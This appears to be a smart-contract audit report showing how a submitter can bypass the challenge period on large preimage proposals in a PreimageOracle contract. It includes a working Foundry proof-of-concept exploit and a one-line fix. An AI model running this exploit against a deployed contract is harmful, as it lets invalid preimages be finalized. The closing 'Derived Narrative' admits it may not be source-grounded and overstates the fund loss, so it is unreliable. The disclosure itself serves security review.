---
id: 21758
severity: "High"
---

# An attacker can bypass the challenge period during LPP finalization

## Description

Large preimage proposals (LPP) allow submitters to prove that certain data is a fixed part of the large preimage that produces a specific Keccak-256 hash value. Since the preimage is large, the process of LPP finalization involves multiple transactions. Because the intermediate steps are not verified on-chain, LPP flow requires a challenge period during which challengers can verify the correctness of the LPP and dispute it on-chain via the `challengeLPP` and `challengeFirstLPP` functions.

The issue arises from the fact that the current implementation of the `squeezeLPP` function allows a malicious submitter to bypass the challenge period and finalize an invalid proposal. I’ve provided a detailed description of why it is possible below.

The `squeezeLPP` function checks that the challenge period is still active using this check:
    
```solidity
if (block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
```

While it looks correct, the problem here is that the timestamp is not initialized in the `initLPP` function. If the `metadata.timestamp()` is zero this check will always succeed (assuming that `block.timestamp > CHALLENGE_PERIOD`). The only place where `metadata.timestamp` is set is in the `addLeavesLPP` function, if the attacker provided a true value for the `_finalize` argument.
    
```solidity
if (_finalize) {
    metaData = metaData.setTimestamp(uint64(block.timestamp));

    // If the number of bytes processed is not equal to the claimed size, the proposal cannot be finalized.
    if (metaData.bytesProcessed() != metaData.claimedSize()) revert InvalidInputSize();
}
```

While it may seem logical, the current flow does not require the submitter to provide a true value for the `_finalize` argument in any of their calls. This fact is demonstrated in the POC below. This means that the submitter can make the necessary number of `addLeavesLPP` calls with `_finalize = false` and then call `squeezeLPP` immediately after (since the `metadata.timestamp` remains uninitialized), without having to wait for the challenge period to pass. Since there is no challenge period, a malicious submitter can submit invalid proposals without the risk of being challenged.

The full attack is demonstrated in the POC below.

## Proof of Concept

```solidity
contract PreimageOracle_LargePreimageProposals_Test is Test {
        ...
        function test_squeeze_challengePeriodActive_not_revert() public {
            //! Set an appropriate value for block.timestamp.
            vm.warp(1721643596);

            // Allocate the preimage data.
            bytes memory data = new bytes(136);
            for (uint256 i; i < data.length; i++) {
                data[i] = 0xFF;
            }
            bytes memory phonyData = new bytes(136);

            // Initialize the proposal.
            oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));

            // Add the leaves to the tree with mismatching state commitments.
            LibKeccak.StateMatrix memory stateMatrix;
            bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
            //! The attacker doesn't set _finalize to true but pads the data correctly.
            oracle.addLeavesLPP(TEST_UUID, 0, LibKeccak.padMemory(phonyData), stateCommitments, false); 

            // Construct the leaf preimage data for the blocks added.
            LibKeccak.StateMatrix memory matrix;
            PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, phonyData);
            leaves[0].stateCommitment = stateCommitments[0];
            leaves[1].stateCommitment = stateCommitments[1];

            // Create a proof array with 16 elements.
            bytes32[] memory preProof = new bytes32[](16);
            preProof[0] = _hashLeaf(leaves[1]);
            bytes32[] memory postProof = new bytes32[](16);
            postProof[0] = _hashLeaf(leaves[0]);
            for (uint256 i = 1; i < preProof.length; i++) {
                bytes32 zeroHash = oracle.zeroHashes(i);
                preProof[i] = zeroHash;
                postProof[i] = zeroHash;
            }

            // Finalize the proposal.
            //! This call must revert since the challenge period has not passed.
            //! However, it does not revert.
            // vm.expectRevert(ActiveProposal.selector);
            uint256 balanceBefore = address(this).balance;
            oracle.squeezeLPP({
                _claimant: address(this),
                _uuid: TEST_UUID,
                _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
                _preState: leaves[0],
                _preStateProof: preProof,
                _postState: leaves[1],
                _postStateProof: postProof
            });

            assertEq(address(this).balance, balanceBefore + oracle.MIN_BOND_SIZE());
            assertEq(oracle.proposalBonds(address(this), TEST_UUID), 0);

            bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
            //! The commented value is the correct value for the preimage part.
            // bytes32 expectedPart = bytes32((~uint256(0) & ~(uint256(type(uint64).max) << 192)) | (data.length << 192));
            //! This value is not correct for the preimage part.
            bytes32 phonyPart = 0x0000000000000088000000000000000000000000000000000000000000000000;
            //! An invalid LPP is finalized and can be used in the MIPS.sol
            assertTrue(oracle.preimagePartOk(finalDigest, 0));
            assertEq(oracle.preimageLengths(finalDigest), phonyData.length);
            assertEq(oracle.preimageParts(finalDigest, 0), phonyPart);
        }
        ...
}
```

## Recommendation

Consider checking that the proposal was finalized in the `squeezeLPP` function:
    
```solidity
if (metaData.timestamp() == 0 || block.timestamp - metaData.timestamp() <= CHALLENGE_PERIOD) revert ActiveProposal();
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a bypass of the intended challenge period that protects large preimage proposals from being finalized with incorrect data. The contract is supposed to record the time when a proposer signals that the proposal is ready for finalisation and then enforce a waiting window during which any challenger can dispute the proposal on‑chain. In the current implementation the timestamp that marks the start of this window is never set unless the proposer explicitly passes a special flag when adding leaves. Because the timestamp field remains at its default value of zero, the check that compares the current block time with the stored timestamp always evaluates as if the challenge period has already elapsed (block.timestamp‑0 is always greater than the configured period). Consequently an attacker can submit all required leaf‑adding transactions with the flag set to false, skip the waiting period entirely and call the finalisation function immediately. The contract then treats the proposal as valid, releases the bond to the proposer and records the preimage parts even though the underlying data does not match the claimed hash. This flaw allows an attacker to obtain the bond reward without providing a correct preimage, effectively letting funds disappear from the protocol’s security pool. The issue appears only when the proposer does not trigger the timestamp update, which is a normal path in the existing flow, making it easy to miss during casual testing. It was discovered during a formal audit that examined the state transitions of the large preimage proposal lifecycle and identified that the timestamp variable was never initialised in the init step. The problem is hard to notice because the contract does not emit an explicit error when the challenge period is bypassed; instead the transaction succeeds and the bond is transferred, which may look like a normal reward. To remediate the bug the finalisation routine must verify that a timestamp has been recorded and reject any call where the timestamp is still zero, or otherwise enforce that the challenge period has truly elapsed before allowing a proposal to be finalised. This change restores the intended economic guarantee that proposals can be challenged before they become effective, preventing invalid preimages from being accepted and protecting the protocol’s funds.
